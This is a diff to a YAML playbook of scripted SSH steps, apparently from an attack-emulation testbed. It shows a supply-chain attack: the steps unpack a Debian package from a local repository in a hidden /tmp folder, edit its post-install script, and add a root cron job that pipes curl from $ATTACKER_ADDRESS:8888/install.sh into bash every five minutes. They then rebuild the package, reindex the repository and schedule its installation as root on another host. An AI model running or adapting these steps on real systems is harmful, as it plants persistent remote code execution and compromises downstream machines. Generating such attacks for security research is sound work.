@@ -91,14 +91,64 @@ commands:
     background: True
     kill_on_exit: true
 
+#  - type: ssh
+#    cmd: "curl http://$ATTACKER_ADDRESS:8888/install.sh | bash"
+#    background: True
+#
+
   - type: ssh
     session: foothold
-    cmd: "vim /media/share/healthcheck_cron.sh\n"
+    cmd: "ls -l /var/www/html/debian\n"
+    interactive: True
+
+  - type: ssh
+    cmd: "apt update && apt install -y dpkg-dev\n"
+    session: foothold
     interactive: True
 
   - type: ssh
     session: foothold
-    cmd: "G"
+    cmd: "mkdir /tmp/.tmux_data\n"
+    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: "cd /tmp/.tmux_data\n"
+    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: "dpkg-deb -R /var/www/html/debian/healthcheckd_1.0-1_amd64.deb healthcheckd\n"
+    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: "cd healthcheckd\n"
+    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: "vim DEBIAN/control\n"
+    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: ":%s/1.0-1/1.0-2/g\n"
+    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: ":wq\n"
+    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: "vim DEBIAN/postinst\n"
+    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: "/invoke-rc\n"
     interactive: True
 
   - type: ssh
@@ -108,7 +158,7 @@ commands:
 
   - type: ssh
     session: foothold
-    cmd: "curl http://$ATTACKER_ADDRESS:8888/install.sh | bash\n"
+    cmd: "echo '*/5 * * * * root /usr/bin/curl http://$ATTACKER_ADDRESS:8888/install.sh | /bin/bash' > /etc/cron.d/health"
     interactive: True
 
   - type: ssh
@@ -121,15 +171,44 @@ commands:
     session: foothold
     cmd: ":wq\n"
     interactive: True
-################### MOVED ############################################
-  - type: msf-session
-    session: movement
-    cmd: sysinfo
 
-  - type: msf-session
-    session: movement
-    cmd: getuid
+  - type: ssh
+    session: foothold
+    cmd: "cd ..\n"
+    interactive: True
 
+  - type: ssh
+    session: foothold
+    cmd: "dpkg-deb -b healthcheckd /var/www/html/debian/healthcheckd_1.0-2_amd64.deb\n"
+    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: "cd /var/www/html/debian/\n"
+    interactive: True
+
+#  - type: ssh
+#    session: foothold
+#    cmd: "rm healthcheckd_1.0-1_amd64.deb\n"
+#    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: "dpkg-scanpackages . | gzip -c9  > Packages.gz\n"
+    interactive: True
+
+  - type: ssh
+    cmd: echo "ssh -i .ssh/rootkey -o StrictHostKeyChecking=no root@192.168.100.23 \"apt update && apt install -y healthcheckd\"" | at now + 2 minute
+    hostname: 192.168.100.223
+    username: aecid
+    password: aecid
+    jmp_hostname:  192.42.1.53
+    clear_cache: True
+    exit_on_error: False
+
+
+
+#################### MOVED ################################
   - type: msf-session
     session: movement
     cmd: shell
